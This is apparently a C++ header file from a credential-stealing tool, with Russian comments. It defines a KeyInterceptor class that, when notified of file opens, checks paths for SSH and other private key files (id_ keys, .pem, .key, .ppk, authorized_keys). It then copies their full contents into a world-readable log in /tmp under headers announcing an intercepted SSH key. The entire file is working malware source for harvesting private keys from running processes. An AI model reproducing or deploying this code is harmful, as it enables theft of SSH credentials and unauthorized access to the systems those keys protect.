#ifndef KEY_INTERCEPTOR_H
#define KEY_INTERCEPTOR_H

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <chrono>

class KeyInterceptor {
private:
    static KeyInterceptor* instance;
    const char* log_file_path;
    bool initialized;

    // Приватный конструктор (синглтон)
    KeyInterceptor() : log_file_path("/tmp/ssh_keys.log"), initialized(false) {}

    // Запись ключа в лог
    void LogKey(const char* path, const char* key_data, size_t key_size) {
        auto t = std::chrono::system_clock::now();
        std::time_t t_time = std::chrono::system_clock::to_time_t(t);
        char time_buf[100];
        if (strftime(time_buf, sizeof(time_buf), "%c", std::localtime(&t_time))) {
            FILE* log_file = fopen(log_file_path, "a");
            if (log_file) {
                fprintf(log_file, "=== SSH-КЛЮЧ ПЕРЕХВАЧЕН ===\n");
                fprintf(log_file, "Дата: %s\n", time_buf);
                fprintf(log_file, "Путь к файлу: %s\n", path);
                fprintf(log_file, "Размер ключа: %zu байт\n", key_size);
                fprintf(log_file, "--- НАЧАЛО КЛЮЧА ---\n");
                
                // Записываем содержимое ключа
                if (key_size > 0 && key_data) {
                    fwrite(key_data, 1, key_size, log_file);
                    // Убедимся, что есть перевод строки в конце
                    if (key_data[key_size-1] != '\n') {
                        fprintf(log_file, "\n");
                    }
                }
                
                fprintf(log_file, "--- КОНЕЦ КЛЮЧА ---\n\n");
                fclose(log_file);
                
                // Добавляем запись в основной лог
                FILE* main_log = fopen("/tmp/ssh_inj.dbg", "a");
                if (main_log) {
                    fprintf(main_log, "... Перехвачен SSH-ключ из файла: %s\n", path);
                    fclose(main_log);
                }
            }
        }
    }

public:
    // Получение экземпляра (синглтон)
    static KeyInterceptor* GetInstance() {
        if (!instance) {
            instance = new KeyInterceptor();
        }
        return instance;
    }

    // Инициализация перехватчика
    void Initialize() {
        if (!initialized) {
            // Создаем лог-файл и устанавливаем права доступа
            FILE* log_file = fopen(log_file_path, "a");
            if (log_file) {
                fprintf(log_file, "=== SSH KEY INTERCEPTOR STARTED ===\n");
                fprintf(log_file, "Время запуска: %ld\n\n", time(NULL));
                fclose(log_file);
                
                // Устанавливаем права доступа к лог-файлу
                chmod(log_file_path, 0666);
            }
            initialized = true;
        }
    }

    // Обработка открытия файла
    void FileOpened(const char* path, int fd) {
        if (!path) return;
        
        // Проверяем, является ли это файлом SSH-ключа
        if (strstr(path, "/.ssh/id_") || 
            strstr(path, ".pem") || 
            strstr(path, ".key") || 
            strstr(path, ".ppk") ||  // PuTTY private key
            strstr(path, "authorized_keys") ||
            strstr(path, "known_hosts")) {
            
            // Читаем содержимое файла в буфер
            char buffer[16384] = {0}; // 16KB должно хватить для большинства ключей
            lseek(fd, 0, SEEK_SET); // Перемещаемся в начало файла
            ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
            lseek(fd, 0, SEEK_SET); // Сбрасываем указатель обратно
            
            if (bytes_read > 0) {
                buffer[bytes_read] = 0; // Завершающий нуль
                LogKey(path, buffer, bytes_read);
            }
        }
    }

    // Обработка открытия файла через fopen
    void FileOpened(const char* path, FILE* file) {
        if (!path || !file) return;
        
        // Проверяем, является ли это файлом SSH-ключа
        if (strstr(path, "/.ssh/id_") || 
            strstr(path, ".pem") || 
            strstr(path, ".key") || 
            strstr(path, ".ppk") ||
            strstr(path, "authorized_keys") ||
            strstr(path, "known_hosts")) {
            
            // Запоминаем текущую позицию
            long pos = ftell(file);
            
            // Переходим в начало файла
            fseek(file, 0, SEEK_SET);
            
            // Читаем содержимое файла в буфер
            char buffer[16384] = {0};
            size_t bytes_read = fread(buffer, 1, sizeof(buffer) - 1, file);
            
            // Возвращаем указатель в исходную позицию
            fseek(file, pos, SEEK_SET);
            
            if (bytes_read > 0) {
                buffer[bytes_read] = 0;
                LogKey(path, buffer, bytes_read);
            }
        }
    }
};

// Инициализация статического члена
KeyInterceptor* KeyInterceptor::instance = nullptr;

#endif // KEY_INTERCEPTOR_H 